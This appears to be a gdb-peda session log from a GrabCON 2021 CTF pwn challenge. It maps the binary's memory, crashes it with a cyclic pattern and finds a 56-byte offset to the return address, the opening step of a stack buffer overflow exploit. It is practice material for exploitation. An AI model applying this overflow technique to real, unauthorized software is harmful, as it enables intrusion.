gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00403000         r-xp	/home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin
0x00403000         0x00404000         r-xp	/home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin
0x00404000         0x00405000         rwxp	/home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin
0x00405000         0x00426000         rwxp	[heap]
0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 0x00007ffff7dcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 0x00007ffff7dcf000 rwxp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd3000 rwxp	mapped
0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd5000 0x00007ffff7fd7000 rwxp	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp	mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]


mito@ubuntu:~/CTF/GrabCON_CTF_2021/Pwn_Easybin$ gdb -q ./easybin 
BFD: warning: /home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin: unsupported GNU_PROPERTY_TYPE (5) type: 0xc0008002
BFD: warning: /home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin: unsupported GNU_PROPERTY_TYPE (5) type: 0xc0010001
BFD: warning: /home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin: unsupported GNU_PROPERTY_TYPE (5) type: 0xc0010002
Reading symbols from ./easybin...(no debugging symbols found)...done.
gdb-peda$ pattc 256
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G'
gdb-peda$ run
Starting program: /home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x405670 ("well lets check if you can bypass me!!!")
RDI: 0x405697 --> 0x0 
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffddd8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
RIP: 0x40119d (<main+51>:	ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x405010 --> 0x0 
R11: 0x0 
R12: 0x401060 (<_start>:	endbr64)
R13: 0x7fffffffdeb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401192 <main+40>:	call   0x401030 <printf@plt>
   0x401197 <main+45>:	mov    eax,0x0
   0x40119c <main+50>:	leave  
=> 0x40119d <main+51>:	ret    
   0x40119e:	xchg   ax,ax
   0x4011a0 <__libc_csu_init>:	endbr64 
   0x4011a4 <__libc_csu_init+4>:	push   r15
   0x4011a6 <__libc_csu_init+6>:	lea    r15,[rip+0x2c53]        # 0x403e00
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddd8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0008| 0x7fffffffdde0 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0016| 0x7fffffffdde8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0024| 0x7fffffffddf0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0032| 0x7fffffffddf8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0040| 0x7fffffffde00 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0048| 0x7fffffffde08 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0056| 0x7fffffffde10 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040119d in main ()
gdb-peda$ patto AcAA2
AcAA2 found at offset: 56
